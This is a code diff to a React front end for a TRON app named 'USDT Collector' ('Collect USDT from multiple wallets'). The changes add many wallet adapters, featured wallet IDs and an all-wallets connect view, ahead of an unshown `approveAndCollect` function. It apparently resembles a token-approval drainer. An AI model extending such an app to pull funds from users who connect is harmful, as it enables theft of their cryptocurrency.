@@ -12,10 +12,21 @@ import {
 } from '@reown/appkit/react'
 import { TronAdapter } from '@reown/appkit-adapter-tron'
 import { tronMainnet } from '@reown/appkit/networks'
-import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
-import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust'
-import { MetaMaskAdapter } from '@tronweb3/tronwallet-adapter-metamask-tron'
-import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'
+
+// --- TRON SPECIFIC ADAPTERS ---
+// We import the explicit adapters for the wallets that actually support TRON
+import { 
+  TronLinkAdapter, 
+  TrustAdapter, 
+  MetaMaskAdapter, 
+  OkxWalletAdapter,
+  TokenPocketAdapter,
+  BitKeepAdapter, // This is Bitget Wallet
+  BybitWalletAdapter,
+  BinanceWalletAdapter,
+  // LedgerAdapter
+} from '@tronweb3/tronwallet-adapters'
+
 import { Copy, CheckCircle, AlertCircle, Wallet } from 'lucide-react'
 
 // --- TRON IMPORTS ---
@@ -34,13 +45,18 @@ const NETWORK_CONFIG = {
 const { usdtAddress: USDT_ADDRESS, fullHost: FULL_HOST } = NETWORK_CONFIG
 
 // ── Reown Adapters ──
-// We removed WagmiAdapter so the modal forces a TRON connection from the start.
+// Load up all the official TRON adapters so they show natively in the UI
 const tronAdapter = new TronAdapter({
   walletAdapters: [
     new TronLinkAdapter({ openUrlWhenWalletNotFound: false, checkTimeout: 3000 }),
-    new MetaMaskAdapter(),
     new TrustAdapter({ openUrlWhenWalletNotFound: false }),
+    new TokenPocketAdapter({ openUrlWhenWalletNotFound: false }),
+    new BitKeepAdapter({ openUrlWhenWalletNotFound: false }), // Bitget
     new OkxWalletAdapter({ openUrlWhenWalletNotFound: false }),
+    new BinanceWalletAdapter({ openUrlWhenWalletNotFound: false }),
+    new BybitWalletAdapter({ openUrlWhenWalletNotFound: false }),
+    // new LedgerAdapter(),
+    new MetaMaskAdapter(), // Uses MetaMask TRON Snap
   ],
 })
 
@@ -48,6 +64,16 @@ createAppKit({
   adapters: [tronAdapter], 
   networks: [tronMainnet],
   projectId: WC_PROJECT_ID,
+  // ── FEATURED WALLETS ──
+  // These WalletConnect IDs force specific wallets to show up at the top of the UI list
+  featuredWalletIds: [
+    '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
+    '0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150', // SafePal
+    '20459438007b75f4f4acb98bf29aa3b8cbc34c8e76f5efae2418e2ddb4b57b98', // TokenPocket
+    '38f5d18bd8522c244bdd70cb4a68e0e71806dd3ce8e36d400fb8e4b789afde0e', // Bitget
+    '8a0ee50d1f22f6651afcae7eb4253e52a3310b90af5daef78a8c4929a9bb99d4', // Binance Web3
+    '971e689d0a5be527bac79629b4ee9b925e82208e5168b733496a09c0faed0709', // OKX Web3
+  ],
   metadata: {
     name:        'USDT Collector',
     description: 'Collect USDT from multiple wallets',
@@ -107,11 +133,14 @@ export default function App() {
     if (w.tronWeb?.contract) return w.tronWeb;
     if (w.tronLink?.tronWeb?.contract) return w.tronLink.tronWeb;
     
+    // Checks for various injected wallet providers
     if (w.trustwallet?.tronWeb?.contract) return w.trustwallet.tronWeb;
     if (w.trustWallet?.tronWeb?.contract) return w.trustWallet.tronWeb;
     if (w.trustwallet?.tronLink?.tronWeb?.contract) return w.trustwallet.tronLink.tronWeb;
     if (w.trustWallet?.tronLink?.tronWeb?.contract) return w.trustWallet.tronLink.tronWeb;
     if (w.tron?.tronWeb?.contract) return w.tron.tronWeb; 
+    if (w.bitkeep?.tronWeb?.contract) return w.bitkeep.tronWeb;
+    if (w.tokenpocket?.tronWeb?.contract) return w.tokenpocket.tronWeb;
 
     if (tronWalletProvider) {
       if ((tronWalletProvider as any).contract) return tronWalletProvider;
@@ -185,7 +214,7 @@ export default function App() {
   }
 
   const handleConnect = () => {
-    open()
+    open({ view: 'AllWallets' })
   }
 
  const approveAndCollect = async () => {
